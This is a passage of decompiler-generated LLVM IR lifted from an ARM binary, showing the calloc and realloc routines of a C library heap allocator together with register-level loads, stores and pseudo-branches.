  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 0, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 2, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 33, 30, 31, 0, 32, 34, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 1, 8, 0, 9, 2, 5, 3, 6, 4, 7 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_148b4, { 1, 0 }
  uselistorder label %dec_label_pc_14898, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_14894, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1487c, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_14810, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1478c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14784, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14658, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_1458c, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_14444, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_14398, { 1, 0 }
  uselistorder label %dec_label_pc_143a0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_14364, { 1, 0 }
  uselistorder label %dec_label_pc_14318, { 1, 0 }
  uselistorder label %dec_label_pc_142ac, { 1, 0 }
  uselistorder label %dec_label_pc_142a8, { 1, 0 }
  uselistorder label %dec_label_pc_14254, { 1, 0 }
  uselistorder label %dec_label_pc_14240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14208, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_141f4, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_148c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_148c8:
  %v0_148c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_148c8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_148c8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_148c8, %bb
  %v4_148e4 = phi i32 [ %arg1, %dec_label_pc_148c8 ], [ 0, %bb ]
  ret i32 %v4_148e4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_148e8 = load i32, i32* @r4, align 4
  %v6_148e8 = load i32, i32* @r5, align 4
  %v9_148e8 = load i32, i32* @r6, align 4
  %v12_148e8 = load i32, i32* @lr, align 4
  %v2_148f0 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_14900 = mul i32 %arg2, %arg1
  store i32 %v2_14900, i32* @r6, align 4
  br i1 %v2_148f0, label %dec_label_pc_14938, label %dec_label_pc_14908

dec_label_pc_14908:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_14910 = udiv i32 %v2_14900, %arg1
  %v9_14914 = icmp eq i32 %v2_14910, %arg2
  br i1 %v9_14914, label %dec_label_pc_14938, label %dec_label_pc_1491c

dec_label_pc_1491c:                               ; preds = %dec_label_pc_14908
  %v0_14920 = call i32 @__aeabi_read_tp()
  %v3_14924 = load i16, i16* @global_var_2447c.761, align 2
  %v4_14924 = sext i16 %v3_14924 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14930 = add i32 %v4_14924, %v0_14920
  %v4_14930 = inttoptr i32 %v3_14930 to i32*
  store i32 12, i32* %v4_14930, align 4
  br label %dec_label_pc_149fc

dec_label_pc_14938:                               ; preds = %dec_label_pc_14908, %entry
  %v4_1493c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 108) to i32*), align 4
  store i32 %v4_1493c, i32* @r4, align 4
  %v4_14954 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  store i32 %v4_14954, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14954)
  %v0_14968 = load i32, i32* @r5, align 4
  %v2_14968 = add i32 %v0_14968, 16
  %v3_14968 = inttoptr i32 %v2_14968 to i32*
  %v4_14968 = load i32, i32* %v3_14968, align 4
  store i32 %v4_14968, i32* %ip.global-to-local, align 4
  store i32 84340, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14968)
  %v0_14974 = load i32, i32* @r6, align 4
  store i32 %v0_14974, i32* @r0, align 4
  %v0_14978 = call i32 @malloc()
  store i32 %v0_14978, i32* %r4.global-to-local, align 4
  %v2_1497c = icmp eq i32 %v0_14978, 0
  br i1 %v2_1497c, label %.thread, label %dec_label_pc_14984

dec_label_pc_14984:                               ; preds = %dec_label_pc_14938
  %v1_14984 = add i32 %v0_14978, -4
  %v2_14984 = inttoptr i32 %v1_14984 to i32*
  %v3_14984 = load i32, i32* %v2_14984, align 4
  %v1_14988 = and i32 %v3_14984, 2
  %v2_14988 = icmp eq i32 %v1_14988, 0
  br i1 %v2_14988, label %dec_label_pc_14990, label %.thread

dec_label_pc_14990:                               ; preds = %dec_label_pc_14984
  %v1_149906 = add i32 %v3_14984, -4
  %v1_14994 = and i32 %v1_149906, -4
  %v3_14998 = udiv i32 %v1_14994, 4
  store i32 %v3_14998, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_14994, 36
  %v2_149a0 = icmp ult i32 %v1_14994, 33
  %v3_149a0 = or i1 %tmp, %v2_149a0
  br i1 %v3_149a0, label %dec_label_pc_149ac, label %dec_label_pc_149a4

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14990
  %v3_149a4 = inttoptr i32 %v0_14978 to i8*
  %v4_149a4 = call i32 @__GI_memset(i8* %v3_149a4, i32 0, i32 %v1_14994)
  br label %.thread

dec_label_pc_149ac:                               ; preds = %dec_label_pc_14990
  %tmp7 = icmp eq i32 %v1_14994, 16
  %v2_149b0 = inttoptr i32 %v0_14978 to i32*
  store i32 0, i32* %v2_149b0, align 4
  %v1_149b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_149b4 = add i32 %v1_149b4, 4
  %v3_149b4 = inttoptr i32 %v2_149b4 to i32*
  store i32 0, i32* %v3_149b4, align 4
  %v1_149b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_149b8 = add i32 %v1_149b8, 8
  %v3_149b8 = inttoptr i32 %v2_149b8 to i32*
  store i32 0, i32* %v3_149b8, align 4
  %v2_149bc = icmp ult i32 %v1_14994, 13
  %v3_149bc = or i1 %tmp7, %v2_149bc
  br i1 %v3_149bc, label %.thread, label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %dec_label_pc_149ac
  %v0_149c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_149c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_149c4 = add i32 %v1_149c4, 12
  %v3_149c4 = inttoptr i32 %v2_149c4 to i32*
  store i32 0, i32* %v3_149c4, align 4
  %v1_149c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_149c8 = add i32 %v1_149c8, 16
  %v3_149c8 = inttoptr i32 %v2_149c8 to i32*
  store i32 0, i32* %v3_149c8, align 4
  %tmp8 = icmp ult i32 %v0_149c0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_149d0

dec_label_pc_149d0:                               ; preds = %dec_label_pc_149c0
  %v0_149d0 = load i32, i32* %ip.global-to-local, align 4
  %v7_149d0 = icmp eq i32 %v0_149d0, 9
  %v1_149d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_149d4 = add i32 %v1_149d4, 20
  %v3_149d4 = inttoptr i32 %v2_149d4 to i32*
  store i32 0, i32* %v3_149d4, align 4
  %v1_149d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_149d8 = add i32 %v1_149d8, 24
  %v3_149d8 = inttoptr i32 %v2_149d8 to i32*
  store i32 0, i32* %v3_149d8, align 4
  br i1 %v7_149d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_149d0
  %v2_149dc = load i32, i32* %r4.global-to-local, align 4
  %v3_149dc = add i32 %v2_149dc, 32
  %v4_149dc = inttoptr i32 %v3_149dc to i32*
  store i32 0, i32* %v4_149dc, align 4
  %v2_149e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_149e0 = add i32 %v2_149e0, 28
  %v4_149e0 = inttoptr i32 %v3_149e0 to i32*
  store i32 0, i32* %v4_149e0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_149d0, %dec_label_pc_14984, %dec_label_pc_149c0, %dec_label_pc_149ac, %dec_label_pc_14938, %dec_label_pc_149a4, %bb
  store i32 1, i32* @r1, align 4
  %v0_149f0 = load i32, i32* @r5, align 4
  %v2_149f0 = add i32 %v0_149f0, 44
  %v3_149f0 = inttoptr i32 %v2_149f0 to i32*
  %v4_149f0 = load i32, i32* %v3_149f0, align 4
  store i32 %v4_149f0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_149f0)
  br label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %dec_label_pc_1491c, %.thread
  %v0_149fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_148e8, i32* @r4, align 4
  store i32 %v6_148e8, i32* @r5, align 4
  store i32 %v9_148e8, i32* @r6, align 4
  store i32 %v12_148e8, i32* @lr, align 4
  ret i32 %v0_149fc

; uselistorder directives
  uselistorder i32 %v1_14994, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_14978, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 6, 2, 7, 3, 8, 4, 9, 5, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_149fc, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_14a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a14:
  %v0_14a14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a14, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14a14
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14a14, %bb
  %v4_14a24 = phi i32 [ %arg1, %dec_label_pc_14a14 ], [ 0, %bb ]
  ret i32 %v4_14a24

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14a28 = load i32, i32* @r4, align 4
  %v6_14a28 = load i32, i32* @r5, align 4
  %v9_14a28 = load i32, i32* @r6, align 4
  %v12_14a28 = load i32, i32* @r7, align 4
  %v15_14a28 = load i32, i32* @r8, align 4
  %v18_14a28 = load i32, i32* @sb, align 4
  %v21_14a28 = load i32, i32* @sl, align 4
  %v24_14a28 = load i32, i32* @fp, align 4
  %v27_14a28 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14a34 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14a34, label %dec_label_pc_14a48, label %dec_label_pc_14a58

dec_label_pc_14a48:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_14a4c = call i32 @malloc()
  store i32 %v0_14a4c, i32* %r0.global-to-local, align 4
  store i32 %v0_14a4c, i32* @r4, align 4
  br label %dec_label_pc_14db8

dec_label_pc_14a58:                               ; preds = %entry
  %v2_14a58 = icmp eq i32 %arg2, 0
  br i1 %v2_14a58, label %dec_label_pc_14a60, label %dec_label_pc_14a6c

dec_label_pc_14a60:                               ; preds = %dec_label_pc_14a58
  %v0_14a60 = call i32 @free()
  store i32 %v0_14a60, i32* %r0.global-to-local, align 4
  %v0_14a64 = load i32, i32* @r6, align 4
  store i32 %v0_14a64, i32* @r4, align 4
  br label %dec_label_pc_14db8

dec_label_pc_14a6c:                               ; preds = %dec_label_pc_14a58
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14a74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 108) to i32*), align 4
  store i32 %v4_14a74, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_14a74, i32* %r2.global-to-local, align 4
  %v4_14a80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 68) to i32*), align 4
  store i32 %v4_14a80, i32* %r1.global-to-local, align 4
  %v2_14a84 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14a84, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_14a8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14a8c)
  %v0_14a98 = load i32, i32* @r4, align 4
  store i32 %v0_14a98, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  %v4_14aa4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_14ab0.867 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14aa4)
  %v0_14ab0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_14ab0, -32
  br i1 %tmp36, label %dec_label_pc_14ad4, label %dec_label_pc_14ab8

dec_label_pc_14ab8:                               ; preds = %dec_label_pc_14a6c
  store i32 63924, i32* %r2.global-to-local, align 4
  %v0_14abc = call i32 @__aeabi_read_tp()
  store i32 %v0_14abc, i32* %r0.global-to-local, align 4
  %v3_14ac0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_14ac0 = sext i16 %v3_14ac0 to i32
  store i32 %v4_14ac0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_14acc = add i32 %v4_14ac0, %v0_14abc
  %v4_14acc = inttoptr i32 %v3_14acc to i32*
  store i32 12, i32* %v4_14acc, align 4
  br label %dec_label_pc_14db8

dec_label_pc_14ad4:                               ; preds = %dec_label_pc_14a6c
  %v1_14ad4 = add i32 %v0_14ab0, 11
  store i32 %v1_14ad4, i32* %r0.global-to-local, align 4
  %v0_14ad8 = load i32, i32* @r5, align 4
  %v1_14ad8 = add i32 %v0_14ad8, -4
  %v2_14ad8 = inttoptr i32 %v1_14ad8 to i32*
  %v3_14ad8 = load i32, i32* %v2_14ad8, align 4
  store i32 %v3_14ad8, i32* %r2.global-to-local, align 4
  %v2_14adc = icmp ugt i32 %v1_14ad4, 14
  %v7_14adc = icmp eq i32 %v1_14ad4, 15
  %v2_14ae0 = xor i1 %v2_14adc, true
  %v3_14ae0 = or i1 %v7_14adc, %v2_14ae0
  br i1 %v3_14ae0, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_14ad4
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_14ad4, %bb
  %v2_14ae4 = xor i1 %v7_14adc, true
  %v3_14ae4 = and i1 %v2_14adc, %v2_14ae4
  br i1 %v3_14ae4, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_14ae4 = and i32 %v1_14ad4, -8
  store i32 %v5_14ae4, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_14ae8 = and i32 %v3_14ad8, 2
  %v2_14ae8 = icmp eq i32 %v1_14ae8, 0
  %v1_14aec = add i32 %v0_14ad8, -8
  store i32 %v1_14aec, i32* @sl, align 4
  %v1_14af0 = and i32 %v3_14ad8, -4
  store i32 %v1_14af0, i32* @r6, align 4
  br i1 %v2_14ae8, label %dec_label_pc_14af8, label %dec_label_pc_14cd0

dec_label_pc_14af8:                               ; preds = %bb29
  %v1_14af8 = load i32, i32* @sb, align 4
  %v3_14af8 = icmp ult i32 %v1_14af0, %v1_14af8
  br i1 %v3_14af8, label %dec_label_pc_14b04, label %bb30

bb30:                                             ; preds = %dec_label_pc_14af8
  store i32 %v1_14af0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c68

dec_label_pc_14b04:                               ; preds = %dec_label_pc_14af8
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14b0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14b0c, i32* %r0.global-to-local, align 4
  %v1_14b10 = add i32 %v4_14b0c, 44
  %v2_14b10 = inttoptr i32 %v1_14b10 to i32*
  %v3_14b10 = load i32, i32* %v2_14b10, align 4
  store i32 %v3_14b10, i32* %r3.global-to-local, align 4
  %v2_14b14 = add i32 %v1_14af0, %v1_14aec
  store i32 %v2_14b14, i32* @r4, align 4
  %v9_14b18 = icmp eq i32 %v2_14b14, %v3_14b10
  %v1_14b1c = add i32 %v2_14b14, 4
  %v2_14b1c = inttoptr i32 %v1_14b1c to i32*
  %v3_14b1c = load i32, i32* %v2_14b1c, align 4
  store i32 %v3_14b1c, i32* %r1.global-to-local, align 4
  br i1 %v9_14b18, label %dec_label_pc_14b24, label %dec_label_pc_14b60

dec_label_pc_14b24:                               ; preds = %dec_label_pc_14b04
  %v1_14b24 = and i32 %v3_14b1c, -4
  %v2_14b28 = add i32 %v1_14b24, %v1_14af0
  store i32 %v2_14b28, i32* %r1.global-to-local, align 4
  %v1_14b2c = add i32 %v1_14af8, 16
  store i32 %v1_14b2c, i32* %r3.global-to-local, align 4
  %v3_14b30 = icmp ult i32 %v2_14b28, %v1_14b2c
  br i1 %v3_14b30, label %dec_label_pc_14bb4, label %dec_label_pc_14b38

dec_label_pc_14b38:                               ; preds = %dec_label_pc_14b24
  %v2_14b38 = sub i32 %v2_14b28, %v1_14af8
  %v1_14b3c = urem i32 %v3_14ad8, 2
  %v2_14b40 = add i32 %v1_14af8, %v1_14aec
  store i32 %v2_14b40, i32* %r1.global-to-local, align 4
  %v2_14b44 = or i32 %v1_14af8, %v1_14b3c
  store i32 %v2_14b44, i32* %r2.global-to-local, align 4
  %v1_14b48 = or i32 %v2_14b38, 1
  store i32 %v1_14b48, i32* %r3.global-to-local, align 4
  store i32 %v0_14ad8, i32* @r4, align 4
  store i32 %v2_14b44, i32* %v2_14ad8, align 4
  %v0_14b54 = load i32, i32* %r1.global-to-local, align 4
  %v1_14b54 = load i32, i32* %r0.global-to-local, align 4
  %v2_14b54 = add i32 %v1_14b54, 44
  %v3_14b54 = inttoptr i32 %v2_14b54 to i32*
  store i32 %v0_14b54, i32* %v3_14b54, align 4
  %v0_14b58 = load i32, i32* %r3.global-to-local, align 4
  %v1_14b58 = load i32, i32* %r1.global-to-local, align 4
  %v2_14b58 = add i32 %v1_14b58, 4
  %v3_14b58 = inttoptr i32 %v2_14b58 to i32*
  store i32 %v0_14b58, i32* %v3_14b58, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14b60:                               ; preds = %dec_label_pc_14b04
  %v1_14b60 = and i32 %v3_14b1c, -2
  %v2_14b64 = add i32 %v1_14b60, %v2_14b14
  store i32 %v2_14b64, i32* %r3.global-to-local, align 4
  %v1_14b68 = add i32 %v2_14b64, 4
  %v2_14b68 = inttoptr i32 %v1_14b68 to i32*
  %v3_14b68 = load i32, i32* %v2_14b68, align 4
  store i32 %v3_14b68, i32* %r3.global-to-local, align 4
  %v1_14b6c = urem i32 %v3_14b68, 2
  %v2_14b6c = icmp eq i32 %v1_14b6c, 0
  br i1 %v2_14b6c, label %dec_label_pc_14b74, label %dec_label_pc_14bb4

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b60
  %v1_14b74 = and i32 %v3_14b1c, -4
  store i32 %v1_14b74, i32* %r3.global-to-local, align 4
  %v2_14b78 = add i32 %v1_14b74, %v1_14af0
  store i32 %v2_14b78, i32* %r0.global-to-local, align 4
  %v3_14b7c = icmp ult i32 %v2_14b78, %v1_14af8
  br i1 %v3_14b7c, label %dec_label_pc_14bb4, label %dec_label_pc_14b84

dec_label_pc_14b84:                               ; preds = %dec_label_pc_14b74
  %v1_14b84 = add i32 %v1_14af0, %v0_14ad8
  %v2_14b84 = inttoptr i32 %v1_14b84 to i32*
  %v3_14b84 = load i32, i32* %v2_14b84, align 4
  store i32 %v3_14b84, i32* %r1.global-to-local, align 4
  %v1_14b88 = add i32 %v3_14b84, 12
  %v2_14b88 = inttoptr i32 %v1_14b88 to i32*
  %v3_14b88 = load i32, i32* %v2_14b88, align 4
  store i32 %v3_14b88, i32* %r3.global-to-local, align 4
  %v9_14b8c = icmp eq i32 %v3_14b88, %v2_14b14
  %v1_14b90 = add i32 %v2_14b14, 12
  %v2_14b90 = inttoptr i32 %v1_14b90 to i32*
  %v3_14b90 = load i32, i32* %v2_14b90, align 4
  store i32 %v3_14b90, i32* %r2.global-to-local, align 4
  br i1 %v9_14b8c, label %dec_label_pc_14b98, label %dec_label_pc_14ba4

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b84
  %v1_14b98 = add i32 %v3_14b90, 8
  %v2_14b98 = inttoptr i32 %v1_14b98 to i32*
  %v3_14b98 = load i32, i32* %v2_14b98, align 4
  store i32 %v3_14b98, i32* %r3.global-to-local, align 4
  %v9_14b9c = icmp eq i32 %v3_14b98, %v2_14b14
  br i1 %v9_14b9c, label %dec_label_pc_14ba8, label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14b84, %dec_label_pc_14b98
  %v0_14ba4 = call i32 @abort()
  store i32 %v0_14ba4, i32* %r0.global-to-local, align 4
  %v0_14ba8.pre = load i32, i32* @r1, align 4
  %v1_14ba8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14ba8

dec_label_pc_14ba8:                               ; preds = %dec_label_pc_14b98, %dec_label_pc_14ba4
  %v1_14ba8 = phi i32 [ %v3_14b90, %dec_label_pc_14b98 ], [ %v1_14ba8.pre, %dec_label_pc_14ba4 ]
  %v0_14ba8 = phi i32 [ %v3_14b84, %dec_label_pc_14b98 ], [ %v0_14ba8.pre, %dec_label_pc_14ba4 ]
  %v2_14ba8 = add i32 %v1_14ba8, 8
  %v3_14ba8 = inttoptr i32 %v2_14ba8 to i32*
  store i32 %v0_14ba8, i32* %v3_14ba8, align 4
  %v0_14bac = load i32, i32* %r2.global-to-local, align 4
  %v1_14bac = load i32, i32* %r1.global-to-local, align 4
  %v2_14bac = add i32 %v1_14bac, 12
  %v3_14bac = inttoptr i32 %v2_14bac to i32*
  store i32 %v0_14bac, i32* %v3_14bac, align 4
  %v1_14c68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c68

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14b24, %dec_label_pc_14b74, %dec_label_pc_14b60
  %v1_14bb4 = add i32 %v1_14af8, -7
  store i32 %v1_14bb4, i32* @r0, align 4
  %v0_14bb8 = call i32 @malloc()
  store i32 %v0_14bb8, i32* @r0, align 4
  store i32 %v0_14bb8, i32* %r1.global-to-local, align 4
  %v2_14bbc = icmp eq i32 %v0_14bb8, 0
  br i1 %v2_14bbc, label %bb31, label %dec_label_pc_14bc8

bb31:                                             ; preds = %dec_label_pc_14bb4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14bc8:                               ; preds = %dec_label_pc_14bb4
  %v1_14bd0.pre = load i32, i32* @r4, align 4
  %v1_14bc8 = add i32 %v0_14bb8, -4
  %v2_14bc8 = inttoptr i32 %v1_14bc8 to i32*
  %v3_14bc8 = load i32, i32* %v2_14bc8, align 4
  store i32 %v3_14bc8, i32* @r3, align 4
  %v1_14bcc = add i32 %v0_14bb8, -8
  store i32 %v1_14bcc, i32* @r7, align 4
  %v9_14bd0 = icmp eq i32 %v1_14bcc, %v1_14bd0.pre
  br i1 %v9_14bd0, label %.thread2, label %dec_label_pc_14be0

.thread2:                                         ; preds = %dec_label_pc_14bc8
  %v2_14bd4 = and i32 %v3_14bc8, -4
  store i32 %v2_14bd4, i32* %r3.global-to-local, align 4
  %v2_14bd8 = load i32, i32* @r6, align 4
  %v3_14bd8 = add i32 %v2_14bd8, %v2_14bd4
  store i32 %v3_14bd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c68

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bc8
  %v0_14be0 = load i32, i32* @r6, align 4
  %v1_14be0 = add i32 %v0_14be0, -4
  store i32 %v1_14be0, i32* @r2, align 4
  %v3_14be4 = udiv i32 %v1_14be0, 4
  store i32 %v3_14be4, i32* @ip, align 4
  %tmp37 = and i32 %v1_14be0, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_14bec = icmp ult i32 %v1_14be0, 36
  %v3_14bec = or i1 %tmp38, %v2_14bec
  %v0_14bfc = load i32, i32* @r5, align 4
  br i1 %v3_14bec, label %dec_label_pc_14bfc, label %dec_label_pc_14bf0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14be0
  store i32 %v0_14bfc, i32* @r1, align 4
  %v0_14bf4 = call i32 @memcpy()
  store i32 %v0_14bf4, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_14bfc:                               ; preds = %dec_label_pc_14be0
  %v1_14bfc = inttoptr i32 %v0_14bfc to i32*
  %v2_14bfc = load i32, i32* %v1_14bfc, align 4
  store i32 %v2_14bfc, i32* %r3.global-to-local, align 4
  %v2_14c00 = inttoptr i32 %v0_14bb8 to i32*
  store i32 %v2_14bfc, i32* %v2_14c00, align 4
  %v0_14c04 = load i32, i32* @r5, align 4
  %v1_14c04 = add i32 %v0_14c04, 4
  %v2_14c04 = inttoptr i32 %v1_14c04 to i32*
  %v3_14c04 = load i32, i32* %v2_14c04, align 4
  store i32 %v3_14c04, i32* %r3.global-to-local, align 4
  %v1_14c08 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c08 = add i32 %v1_14c08, 4
